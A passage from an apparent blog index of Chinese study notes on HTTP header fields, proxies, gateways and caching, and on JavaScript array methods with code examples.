首部字段内的指令。如上例，Cache-Control 首部字段本身没有 community 这个指令。借助extension tokens 实现了该指令的添加。如果缓存服务器不能理解community 这个新指令，就会直接忽略。因此，extension tokens 仅对能理解它的缓存服务器来说是有意义的。 ConnectionConnection 首部字段具备以下两个作用 控制不再转发给代理的首部字段 1Connection: 不再转发的首部字段名 管理持久连接 1Connection: close HTTP/1.1 版本的默认连接都是持久连接。为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，则指定Connection 首部字段的值为 Close。 1Connection: Keep-Alive HTTP/1.1 之前的 HTTP 版本的默认连接都是非持久连接。为此，如果想在旧版本的 HTTP 协议上维持持续连接，则需要指定Connection 首部字段的值为 Keep-Alive。 Date首部字段 Date 表明创建 HTTP 报文的日期和时间。 1Date: Tue, 03 Jul 2012 04:40:59 GMT 之前的 HTTP 协议版本中使用在 RFC850 中定义的格式，如下所示。 1Date: Tue, 03-Jul-12 04:40:59 GMT 除此之外，还有一种格式。它与 C 标准库内的 asctime() 函数的输出格式一致。 1Date: Tue Jul 03 04:40:59 2012 PragmaPragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0的向后兼容而定义。 1Pragma: no-cache 该首部字段属于通用首部字段，但只用在客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。 所有的中间服务器如果都能以 HTTP/1.1 为基准，那直接采用 Cache-Control: no-cache 指定缓存的处理方式是最为理想的。但要整体掌握全部中间服务器使用的 HTTP 协议版本却是不现实的。因此，发送的请求会同时含有下面两个首部字段。 12Cache-Control: no-cachePragma: no-cache Trailer首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在 HTTP/1.1 版本分块传输编码时。 123456789HTTP/1.1 200 OKDate: Tue, 03 Jul 2012 04:40:56 GMTContent-Type: text/html...Transfer-Encoding: chunkedTrailer: Expires...(报文主体)...0Expires: Tue, 28 Sep 2004 23:59:59 GMT 以上用例中，指定首部字段 Trailer 的值为 Expires，在报文主体之后（分块长度 0 之后）出现了首部字段 Expires。 Transfer-Encoding首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式。 HTTP/1.1 的传输编码方式仅对分块传输编码有效。 12345678910111213141516171819HTTP/1.1 200 OKDate: Tue, 03 Jul 2012 04:40:56 GMTCache-Control: public, max-age=604800Content-Type: text/javascript; charset=utf-8Expires: Tue, 10 Jul 2012 04:40:56 GMTX-Frame-Options: DENYX-XSS-Protection: 1; mode=blockContent-Encoding: gzipTransfer-Encoding: chunkedConnection: keep-alivecf0 ←16进制(10进制为3312)...3312字节分块数据...392 ←16进制(10进制为914)...914字节分块数据...0 以上用例中，正如在首部字段 Transfer-Encoding 中指定的那样，有效使用分块传输编码，且分别被分成 3312 字节和 914 字节大小的分块数据。 Upgrade首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。 上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定Connection:Upgrade。对于附有首部字段 Upgrade 的请求，服务器可用 101 SwitchingProtocols 状态码作为响应返回。 Via使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。报文经过代理或网关时，会先在首部字段 Via 中附加该服务器的信息，然后再进行转发。这个做法和traceroute 及电子邮件的 Received首部的工作机制很类似。首部字段 Via 不仅用于追踪报文的转发，还可避免请求回环的发生。所以必须在经过代理时附加该首部字段内容。 上图用例中，在经过代理服务器 A 时，Via 首部附加了“1.0gw.hackr.jp (Squid/3.1)”这样的字符串值。行头的 1.0 是指接收请求的服务器上应用的 HTTP 协议版本。接下来经过代理服务器 B 时亦是如此，在 Via 首部附加服务器信息，也可增加 1 个新的 Via 首部写入服务器信息。 Via 首部是为了追踪传输路径，所以经常会和 TRACE 方法一起使用。比如，代理服务器接收到由 TRACE 方法发送过来的请求（其中Max-Forwards: 0）时，代理服务器就不能再转发该请求了。这种情况下，代理服务器会将自身的信息附加到 Via 首部后，返回该请求的响应。 WarningHTTP/1.1 的 Warning 首部是从 HTTP/1.0 的响应首部（Retry-After）演变过来的。该首部通常会告知用户一些与缓存相关的问题的警告。 1Warning: 113 gw.hackr.jp:8080 "Heuristic expiration" Tue, 03 Jul 2012 Warning 首部的格式如下。最后的日期时间部分可省略。 1Warning: [警告码][警告的主机:端口号]“[警告内容]”([日期时间]) HTTP/1.1 中定义了 7 种警告。警告码对应的警告内容仅推荐参考。另外，警告码具备扩展性，今后有可能追加新的警告码。 警告码 警告内容 说明 110 Response is stale（响应已过期） 代理返回已过期的资源 111 Revalidation failed（再验证失败） 代理再验证资源有效性时失败（服务器无法到达等原因） 112 Disconnection operation（断开连接操 代理与互联网连接被故意切断 113 Heuristic expiration（试探性过期） 响应的使用期超过24小时（有效缓存 199 Miscellaneous warning（杂项警告） 任意的警告内容 214 Transformation applied（使用了转换） 代理对内容编码或媒体类型等执行了 299 Miscellaneous persistent warning（持久 任意的警告内容 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第二章）—— 数组]]></title>
    <url>%2F2018-08-16-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part2.html</url>
    <content type="text"><![CDATA[第二章 数组几乎所有的编程语言都原生支持数组类型，因为数组是最简单的内存数据结构。JavaScript里也有数组类型，虽然它的第一个版本并没有支持数组。本章将深入学习数组数据结构和它的能力。 为什么用数组需求：保存所在城市每个月的平均温度，可以这么实现 123456var averageTemp1 = 43.3;var averageTemp2 = 53.2;var averageTemp3 = 14.2;var averageTemp4 = 42.8;var averageTemp5 = 14.8;var averageTemp6 = 78.9; 只是保存前六个月就用了6个变量，显然这种方式不适合保存这类需求。通过数组可以简单地实现我们的需求。 1234567var averageTemp = [];averageTemp[0] = 43.3;averageTemp[1] = 53.2;averageTemp[2] = 14.2;averageTemp[3] = 42.8;averageTemp[4] = 14.8;averageTemp[5] = 78.9; 创建和初始化数组声明、创建和初始化数组的方式很简单 123var temp = new Array(); // 使用 new 关键字，简单声明并初始化一个数组var temp = new Array(8); // 还可以创建一个指定长度的数组var temp = new Array(1,2,4,9); // 直接将数组元素作为参数传递给它的构造器 除了用 new创建数组，还可以通过中括号 []简单创建数组。 1var temp = [1,2,4,9]; 访问元素和迭代数组通过在数组里指定特定位置的元素，可以获取该值或者赋值。而要知道一个数组里所有的元素，可以通过循环遍历数组。 123for(var i = 0; i &lt; temp.length; i++)&#123; console.log(temp[i]); // 1,2,4,9&#125; 案例：斐波那契数列已知斐波那契数列中的第一个数字是1，第二个数字是2，从第三项开始，每一项都等于前两项之和。求斐波那契数列的前20个数 12345678var fibonacci = [];fibonacci[1] = 1;fibonacci[2] = 2;for(var i =3; i &lt; 20; i++)&#123; fibonacci[i] = fibonacci[i-1] + fibonacci[i-2];&#125;console.log(fibonacci); // [ 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765] 添加元素123var number = [1,2,3];number[number.length] = 4;number // 1,2,3,4 上述代码可以在数组的最后一位添加元素，但其实还有更加简便的方法： pushpush 能添加任意个元素在数组的末尾 123number.push(5); // 5number.push(6,7); //7number // [1,2,3,4,5,6,7] 数组使用 push 会返回数组的长度 插入元素到数组首位首先我们要腾出数组的第一个元素的位置，把所有的元素向右移动一位。我们可以循环数组中的元素，从最后一位+1（长度）开始，将其对应的前一个元素的值赋给它，依次处理，最后把我们想要的值赋给第一个位置（-1）上。 1234for(var i = number.length; i&gt;=0; i--)&#123; number[i] = number[i-1];&#125;number[0] = -0; unshift或者直接 使用 unshift 方法，可以将数值插入数组的首位： 1234var number = [1,2,3,4];number.unshift(-2); // 5number.unshift(-4,-3); // 7number // [-4, -3, -2, 1, 2, 3, 4] 数组使用 unshift 会返回数组的长度 删除元素从数组尾部删除元素pop要删除最靠后的元素可以使用 pop 方法，会删除并返回数组的最后一个元素。如果数组已经为空，则 pop() 不改变数组，并返回 undefined 值。 12345var number = [1,2,3,4];number.pop(); //4number // [1,2,3]number.pop() // 3number // [1] 从数组首部删除元素如果要移除数组里的第一个元素，可以使用下面的代码 12345var number = [1,2,3,4];for(var i = 0;i &lt; number.length; i++)&#123; number[i] = number[i+1];&#125;number // [2, 3, 4, undefined] 可以看出，我们将数组左移了一位，但数组的长度仍然没有变化，这意味着数组中有一个额外的元素，因为没有定义，所以是 undefined shiftshift() 方法用于把数组的第一个元素从其中删除，并返回第一个元素的值。 数组的长度也会发生变化。如果数组是空的，那么 shift() 方法将不进行任何操作，返回 undefined 值。 小结 修改数组的方法 描述 push push() 方法可向数组的末尾添加一个或多个元素，并返回新的长度。 unshift unshift() 方法可向数组的开头添加一个或更多元素，并返回新的长度。 pop pop() 方法用于删除并返回数组的最后一个元素。 如果数组已经为空，则 pop() 不改变数组，并返回 undefined 值。 shift shift() 方法用于把数组的第一个元素从其中删除，并返回第一个元素的值。 如果数组是空的，那么 shift() 方法将不进行任何操作，返回 undefined 值 push() 方法和 pop() 方法，能用数组模拟基本的栈的数据结构（先进后出）。 shift()方法和unshift()方法，能用数组模拟基本的队列的数据结构（先进先出 ）。 在任意位置添加或者删除元素已经知道如何删除数组开头和结尾的元素，那么该怎么在数组中的任意位置删除或者添加元素？ splicesplice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。 splice() 方法可删除从 index 处开始的零个或多个元素，并且用参数列表中声明的一个或多个值来替换那些被删除的元素。 语法 1arrayObject.splice(index,howmany,item1,.....,itemX) 例子 12345var number = [1,2,3,4];number.splice(2,0,4,4,5); // []number //[1, 2, 4, 4, 5, 3, 4]number.splice(2,5,7); // [4, 4, 5, 3, 4]number //[1, 2, 7] 二维或者多维数组我们知道如果要记录数天内每个小时的气温，可以使用数组来保存这些数据。那么要保存两天每小时气温的数据的时候可以这样。 12var averageTemp1 = [32,53,45,23,46,53];var averageTemp2 = [98,32,74,34,63,73]; 然而这不是最好的方法。可以使用矩阵（二维数组）来存储这些信息。矩阵的行保存每天的数据，列对应小时级别的数据。 123var averageTemp = [];averageTemp[0] = [32,53,45,23,46,53];averageTemp[1] = [98,32,74,34,63,73]; JavaScript只支持一维数组，并不支持矩阵。但是，可以用数组套数组来模拟矩阵或者任一多维数组。 迭代二维数组的元素如果想看到这矩阵的输出，可以创建一个通用函数，专门输出其中的值： 12345678function printMatrix(x)&#123; for(var i = 0; i &lt; x.length; i++)&#123; for(var j = 0; j&lt; x[i].length; j++)&#123; console.log(x[i][j]); &#125; &#125;&#125;printMatrix(averageTemp); 多维数组我们也可以用这种方式来处理多维数组。假如我们要创建一个3x3x3的矩阵，每一个格子里包含矩阵的i（行）、j（列）、z（深度）之和： 1234567891011var matrix3x3x3 = [];for(var i = 0; i &lt; 3; i++)&#123; matrix3x3x3[i] = []; for(var j = 0; j &lt; 3; j++)&#123; matrix3x3x3[i][j] = []; for(var z = 0; z &lt; 3; z++)&#123; matrix3x3x3[i][j][z] = i+j+z; &#125; &#125;&#125; 数据结构中有几个维度都没有关系，都可以用循环遍历每个维度来访问所有格子 1234567for(var i = 0; i &lt; matrix3x3x3.length; i++)&#123; for(var j = 0; j&lt; matrix3x3x3[i].length; j++)&#123; for(var z = 0; z &lt; matrix3x3x3[i][j].length; z++)&#123; console.log(matrix3x3x3[i][j][z]); &#125; &#125;&#125; 如果是一个3x3x3x3的矩阵，代码中就会用四层嵌套的 for 语句，以此类推。 JavaScript 的数组方法参考在JavaScript里，数组是可以修改的对象。这意味着创建的每一个数组都有一些可用的方法。 下面表格是数组的一些核心方法。 方法名 描述 concat 连接2个或者更多数组，并返回结果 every 对数组中的每一项运行给定函数，如果该函数对每一项都但返回true,则返回true filter 对数组中度过每一项运行给定函数，返回该函数会返回true的项组成分数组 forEach 对数组中更多每一项运行给定函数，这个方法没有返回值 join 将所有的数组元素连接成一个字符串 indexOf 返回第一个与给定参数相等的数组元素的索引，没有找到则返回-1 lastIndexOf 返回在数组中搜索到的与给定参数相等的元素的索引里最大的值 map 对数组中的每一项运行给定函数，返回每次函数调用结果组成的数组 reverse 颠倒数组中的元素的顺序，原先第一个元素现在变成了最后一个，同样原先的最后一个元素变成了现在的第一个 slice 传入索引值，将数组里对应索引范围内的元素作为新数组返回 some 对数组中每一项运行给定函数，如果任一项返回true,则返回true sort 按照字母的顺序对数组排序，支持传入指定排序方法的函数作为参数 toString 将数组作为字符串返回 valueOf 和 toString 相似，将数组作为字符串返回 数组合并有多个数组，需要合并起来成为一个数组。我们可以迭代各个数组，然后把每个元素加入最终的数组。 JavaScript也有提供相对应的方法 concat() 12345var a = 0;var b = [1,2,3];var c = [-3,-2,-1];var s = c.concat(a,b);s // [-3, -2, -1, 0, 1, 2, 3] 迭代器函数有时候，我们需要迭代数组中的元素。可以使用循环语句（前面提到的for语句等）。而其实 JavaScript 内置了许多数组可以使用的迭代方法。 对于本节的例子，我们需要函数和数组。假如有一个数组，值是从1到15，如果数组里面的元素可以被2整除（偶数），函数就要返回true,否则就返回false: 12345var isEven = function(x)&#123; // 如果是 2的倍数，就返回 true return (x % 2 == 0);&#125;var number = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]; everyevery 会迭代数组中的每个元素，直到返回 false。 1number.every(isEven) 在这个例子中，数组number第一个元素是1，不是2的倍数，因此 isEven 函数返回false,然后 every 执行结束。 somesome 方法和 every 相似，不过some方法会迭代数组中的每个元素，直到函数返回true 1number.some(isEven) 这个例子中，数组的第二个参数是2，为2的倍数，因此返回true，迭代结束 forEach如果要迭代整个数组可以用 forEach 方法，和使用 for 循环相同： 123number.forEach(function(x)&#123; console.log((x % 2 == 0));&#125;); map &amp; filterJavaScript还有两个会返回新数组的遍历方法。第一个是 map： 12var myMap = number.map(isEven);myMap // [false, true, false, true, false, true, false, true, false, true, false, true, false, true, false] 从上面代码可以看出，myMap保存了传入 map 方法的 isEven函数运行的结果。这样就可以很容易知道一个元素是否偶数。 还有一个filter方法，它返回的新数组由使函数返回 true 的元素组成： 12var evenNumbers = number.filter(isEven);evenNumbers // [2, 4, 6, 8, 10, 12, 14] reducereduce() 方法接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。 语法 1array.reduce(function(total, currentValue, currentIndex, arr), initialValue) 参数 描述 total 必需。初始值, 或者计算结束后的返回值。 currentValue 必需。当前元素 currentIndex 可选。当前元素的索引 arr 可选。当前元素所属的数组对象。 如果要对一个数组中所有元素进行求和，这就很有用 1234number.reduce(function(total,currentValue,index)&#123; return total + currentValue;&#125;);// 120 ES6 和数组的新功能下表是ES6/7新增的数组方法 方法 描述 @@iterator 返回一个包含数组键值对的迭代器对象，可以通过同步调用得到数组元素的键值对 copyWithin 复制数组中一系列元素到同一数组指定的起始位置 entries 返回包含数组所有键值对的@@iterator includes 如果数组中存在某个元素则返回 true,否则返回false,ES7新增 find 根据回调函数给定的条件从数组中查找元素，如果找到就返回该元素 findIndex 根据回调函数给定的条件从数组中寻找元素，如果找到就返回该元素在数组中的索引 fill 用静态值填充数组 from 根据已有数组创建一个新数组 keys 返回包含数组所有索引的@@iterator of 根据传入的参数创建一个新数组 values 返回包含数组中所有值的@@iterator 除了这些新的方法，还有一种用 for… of循环来迭代数组的新做法，以及可以从数组实例得到的迭代器对象。 使用 forEach 和箭头函数箭头函数可以简化使用 forEach迭代数组元素的做法 1234567number.forEach(function(x)&#123; console.log (x % 2 == 0);&#125;)// 等于number.forEach(x =&gt; &#123; console.log(x % 2 == 0);&#125;); 使用 for…of 循环迭代123for(let n of number)&#123; console.log(n % 2 == 0);&#125; 使用ES6新的迭代器（@@iterator）ES6还为 Array 类增加了一个 @@iterator 属性，需要通过 Symbol.iterator来访问。 1234567let iterator = number[Symbol.iterator]();console.log(iterator.next().value); // 1console.log(iterator.next().value); // 2console.log(iterator.next().value); // 3console.log(iterator.next().value); // 4console.log(iterator.next().value); // 5console.log(iterator.next().value); // 6 因为number数组中有15个值，所以需要调用15次 iterator.next().value ，数组中所有值都迭代完之后，就会返回 undefined。 数组的 entries、keys 和 values 方法 ES6还增加了三种从数组中得到迭代器的方法。 entries 方法返回包含键值对的 @@iterator 1234let aEntries = number.entries(); // 得到键值对的迭代器console.log(aEntries.next().value); // [0,1] -- 位置0的值为1console.log(aEntries.next().value); // [1,2] -- 位置1的值为2console.log(aEntries.next().value); // [2,3] -- 位置2的值为3 number 数组中都是数字，key是数组中的位置，value是保存在数组中索引的值 使用集合、字段、散列表等数据结构时，能够取出键值对是很有用的。后面会详细讲解。 key 方法返回包含数组索引的 @@iterator 1234let aKeys = number.entries(); // 得到数组索引的迭代器console.log(aKeys.next()); // &#123; value： 0， done: false&#125;console.log(aKeys.next()); // &#123; value： 1， done: false&#125;console.log(aKeys.next()); // &#123; value： 2， done: false&#125; keys方法会返回number数组的索引。一旦没有可以迭代的值，aKeys.next() 就会返回一个value属性为undefined，done属性为 true的对象。如果 done属性为false，就意味着还有可以迭代的值。 使用from方法Array.from方法根据已有的数组创建一个新数。比如复制number数组： 12let number2 = Array.from(number);number2 // [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15] 使用Array.ofArray根据传入的参数创建一个新数组、 1234567let number3 = Array.of(1);let number4 = Array.of(1,2,3,4,5,6);number3 // [1]number4 // [1,2,3,4,5,6]// 复制已有的数组let numberCopy = Array.of(...number4);numberCopy // [1,2,3,4,5,6] 使用fill方法fill方法用静态值充填数组。 123456let numberCopy = Array.of(1,2,3,4,5,6);numberCopy.fill(0); // [0, 0, 0, 0, 0, 0]// 指定开始充填的索引numberCopy.fill(2,1); // [0, 2, 2, 2, 2, 2]// 指定结束的索引(结束的索引不包括本身)numberCopy.fill(1,3,5); // [0, 2, 2, 1, 1, 2] 创建数组并初始化的时候，fill 方法就非常好用。 1let ones = Array(6).fill(1); // 创建了一个长度为6，所有值都是1的数组 使用copyWithin方法copyWithin方法复制数组中的一系列元素到同一个数组指定的起始位置。 语法： 1array.copyWithin(target, start, end) 参数 描述 target 必需。复制到指定目标索引位置。 start 可选。元素复制的起始位置。 end 可选。停止复制的索引位置 (默认为 array.length)。如果为负值，表示倒数。 12345let copyArray = [1,2,3,4,5,6];copyArray.copyWithin(0,3); // [4, 5, 6, 4, 5, 6]let copyArray1 = [1,2,3,4,5,6];copyArray1.copyWithin(1,3,5); // [1, 4, 5, 4, 5, 6] 排序元素反序输出最开始的长度为15的number数组。 12number.reverse();// [15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1] 尝试使用JavaScript自带的排序函数 sort(); 12number.sort();//[1, 10, 11, 12, 13, 14, 15, 2, 3, 4, 5, 6, 7, 8, 9] 跟我们预期的有些不一样，这是因为 sort 方法在对数组进行排序 的时候，把元素默认成字符串进行相互比较。所以我们要自己定义一个比较函数。 1234number.sort((a,b) =&gt;&#123; return a -b;&#125;)// [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15] 上述代码，如果 b 大于 a，会返回负数，反之就是正数。如果相等的话，就会返回0。下面的写法会清晰一点 12345678910function compare(a, b)&#123; if(a &lt; b)&#123; return -1; &#125; if(a &gt; b)&#123; return 1; &#125; return 0;&#125;number.sort(compare); sort 方法接受 compareFunction作为参数来比较元素。然后sort 会用它来排序数组 自定义排序我们可以对任何对象类型的数组排序，也可以创建 compareFuntion 来比较元素。例如对象 Person 有名字和属性，我们希望根据年龄排序。 123456789101112var friends = [ &#123;name: 'John', age: 30&#125;, &#123;name: 'Ana', age: 20&#125;, &#123;name: 'Chris', age: 25&#125;];friends.sort((a, b) =&gt;&#123; return a.age - b.age;&#125;)// &#123;name: "Ana", age: 20&#125; &#123;name: "Chris", age: 25&#125; &#123;name: "John", age: 30&#125; 字符串排序 123var names = ['Ana', 'ana', 'John', 'john'];names.sort();// ["Ana", "John", "ana", "john"] 字符串的比较是根据对应的 ASCⅡ值来比较的。例如 A、J、a、j对应分别是65、74、97、106。 虽然字母表的 a 是排靠前的，但是由于 ASCⅡ值 比较大，所以没有排在首位。如果忽略大小写呢？会是怎么样 12345678910names.sort((a, b) =&gt;&#123; if(a.toLowerCase() &lt; b.toLowerCase())&#123; return -1; &#125; if(a.toLowerCase() &gt; b.toLowerCase())&#123; return 1; &#125; return 0; &#125;)// ["Ana", "ana", "John", "john"] 搜索搜索有两个方法：indexOf方法返回与参数匹配的第一个元素的索引，lastIndexOf返回与参数匹配的最后一个元素的索引。 123456number.indexOf(10); // 9number.indexOf(100); // -1 （因为100不存在数组里面）number.puhs(10);number.lastIndexOf(10); // 15number.lastIndexOf(100) // -1 ES6 find 和 findIndex方法123456let number = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15];const multipleof13 = (element, index, array) =&gt; &#123; return (element % 13 == 0);&#125;number.find(multipleof13); //13number.findIndex(multipleof13); // 12 find 和 findIndex方法接受一个回调函数，搜索一个满足回调函数条件的值。上面的例子中，我们要从数组里找有个13的倍数。 ES7 使用includes方法如果数组存在某个元素，includes 方法就会返回 true,否则就返回 false。 1234number.includes(15) // truenumber.includes(20) // falsenumber.includes(4,4) // false 第二个参数为开始搜索的索引 输出字符串toString 和 jion 方法 如果想把数组里所有元素输出位一个字符串，可以使用 toString 方法 1number.toString(); // "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15" 还可以用不同的分隔符将元素隔开 1number.join(&apos;-&apos;); // &quot;1-2-3-4-5-6-7-8-9-10-11-12-13-14-15&quot; 类型数组JavaScript由于不是强类型的，因此可以存储任意类型的数据，而类型数组则用于存储单一的数据。 语法： 1let myArray = new TypedArray(length); 类型数组 数据类型 Int8Array 8位二进制补码整数 Unit8Array 8位无符号整数 Unit8ClampedArray 8位无符号整数 Int16Array 16位二进制补码整数 Unit16Array 16位无符号整数 Int32Array 32位二进制补码整数 Unit32Array 32位无符号整数 Float32Array 32位IEEE浮点数 Float64Array 64位IEEE浮点数 12345678910let length = 5;let int16 = new Int16Array(length);let array16 = [];array16.length = length;for(let i = 0;i &lt; length; i++)&#123; int16[i] = i + 1;&#125;console.log(int16); // [1, 2, 3, 4, 5] 使用 webGl API、进行位操作、处理文件和图像时候，类型数组都可以大展拳脚。它用起来和普通数组也毫无二致，本节所学的数组方法和功能都可以用于类型数组。 小结学习了常见的数据结构：数组。学习了怎么声明和初始化数组，给数组赋值后，以及添加和移除数组元素，学了多维数组和数组的一些操作方法。 下一章，学习栈，一种具有特殊行为的数组。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第五章）—— HTTP 协作的 Web 服务器]]></title>
    <url>%2F2018-08-15-read-%E5%9B%BE%E8%A7%A3HTTP-Part5.html</url>
    <content type="text"><![CDATA[第五章 与 HTTP 协作的 Web 服务器用单台虚拟主机实现多个域名HTTP/1.1 规范运行一台HTTP服务器搭建多个 Web 站点。比如，提供 Web 托管服务 （Web Hosting Server）的供应商，可以用一台服务器为多为客户服务，也可以以每位客户持有的域名运行各自不同分网站。这是因为利用了虚拟主机（Virtual Host，又称为虚拟服务器）的功能。 即使物理层面只有一台服务器，但只要使用虚拟主机的功能，则可以假想已有多台服务器。 客户端使用HTTP协议访问服务器时，就会经常采用类似 www.xxx.xxx 的这样的主机名和域名。 在互联网上，域名通过 DNS 服务映射到 IP 地址（域名解析）之后访问目标网站。可见，当请求发送到服务器时，已经是以 IP 的地址形式访问了。 所以，如果一台服务器内托管了 www.a.com 和 www.b.com 这两个域名，那么当收到请求的时候就要清楚究竟是要访问哪个域名，因为它们同时部署在同一个服务器上，会有相同的 IP 地址。使用 DNS 服务解析域名后，两者的访问 IP 地址会相同。 所以在相同的 IP 地址下，由于虚拟主机可以寄存多个不同的主机名名和域名的 Web 网站，因此在发送 HTTP 请求时，必须在 HOST 首部内完整指定主机名或者是域名的 URI 。 通信数据转发程序：代理、网关、隧道HTTP 通信时，除客户端和服务器以外，还有一些用于通信数据转发的应用程序，例如代理、网关和隧道。它们可以配合服务器工作。 这些应用程序和服务器可以将请求转发给通信线上的下一站服务器，并且可以接受从那台服务器发送的响应再转发客户端。 通信数据转发程序 描述 代理 代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接受服务器返回的响应并转发给客户端。 网关 网关是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，同时也接收服务器返回的响应并转发给客户端。 隧道 隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序。 代理 代理服务器的基本行为就是接收客户端发送的请求后转发给其他服务器。代理不改变请求的 URI ，会直接发送给前方持有资源的目的服务器。 持有资源实体的服务器被称为源服务器。从源服务器返回的响应经过代理服务器后再传回客户端。 图：每次代理服务器转发请求或者响应时，会追加写入 Via 首部消息 在 HTTP 通信过程中，可级联多台代理服务器。请求和响应的转发会经过数台类似锁链一样连接的代理服务器。转发时，需要附加 Via 首部字段以标记出经过的主机信息。 使用代理服务器的理由有：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的，等等。 代理有多种使用方法，按两种基准分类。一种是是否使用了缓存，另一种是是否会修改报文。 代理分类 描述 缓存代理 代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。 透明代理 转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。 网关 图：利用网关可以由 HTTP 请求转化为其他协议通信 网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非 HTTP 协议服务。 利用网关能提高通信的安全性，因此可以在客户端与网关之间的通信线路上加密以确保连接的安全。如，网关可以连接数据库，使用 SQL 语句查询数据。另外，在 Web 购物网站上进行信用卡结算时，网关可以和信用卡就算系统联动。 隧道隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL 等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。 隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双发断开时结束。 图：通过隧道的传输，可以和远距离的服务器安全通信。隧道本身是透明的，客户端不用在意隧道的存在 保存资源的缓存缓存是指代理服务器或客户端本地磁盘内保存的资源副本。利用缓存可减少对源服务器的访问，因此也就节省了通信流量和通信时间。 缓存服务器是代理服务器的一种，并归类在缓存代理类型中。换句话说，当代理转发从服务器返回的响应时，代理服务器将会保存一份资源的副本。 缓存服务器的优势在于利用缓存可以避免多次从源服务器转发资源。因此客户端可就近从缓存服务器上获取资源，而源服务器也不必多次处理相同的请求了。 缓存的有效期限即便缓存服务器内有缓存，也不能保证每次都会返回对同资源的请求。因为这关系到被缓存资源的有效性问题。 当遇上源服务器上的资源更新时，如果还是使用不变的缓存，那就会演变成返回更新前的“旧”资源了。 即便存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性。若判断缓存失效，缓存服务器将会再次从源服务器上获取“新”资源。 客户端的缓存缓存不仅可以存在于缓存服务器内，还可以存在客户端浏览器中。以 Internet Explorer 程序为例。把客户端缓存称为临时网络文件（Temporary Internet File）。 浏览器缓存如果有效，就不必再向服务器请求相同的资源了，就可以直接从本地磁盘内读取。 另外，和缓存服务器相同的一点是，当判定缓存过期后，会向源服务器确认资源的有效性。若判断浏览器缓存失效，浏览器会再次请求新的资源。 在 HTTP 出现之前的协议在 HTTP 普及之前，也就是从互联网的诞生期至今，曾出现过各式各样的协议。在 HTTP 规范确立之际，制定者们参考了那些协议的功能。也有某些协议现在已经彻底退出了人们的视线。接下来，我们会简单介绍一下这些协议。 FTP（File Transfer Protocol）传输文件时使用的协议。该协议历史久远，可追溯到 1973 年前后，比 TCP/IP 协议族的出现还要早。虽然它在 1995 年被 HTTP 的流量（Traffic）超越，但时至今日，仍被广泛沿用。 NNTP（Network News Transfer Protocol）用于 NetNews 电子会议室内传送消息的协议。在 1986 年前后出现，属于比较古老的一类协议。现在，利用 Web 交换信息已成主流，所以该协议已经不怎么使用了。 Archie搜索 anonymous FTP 公开的文件信息的协议。1990 年前后出现，现在已经不常使用。 WAIS（Wide Area Information Servers）以关键词检索多个数据库使用的协议。1991 年前后出现。由于现在已经被 HTTP 协议替代，也已经不怎么使用了。 Gopher查找与互联网连接的计算机内信息的协议。1991 年前后出现，由于现在已经被 HTTP 协议替代，也已经不怎么使用了。 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第四章）—— HTTP 状态码]]></title>
    <url>%2F2018-08-13-read-%E5%9B%BE%E8%A7%A3HTTP-Part4.html</url>
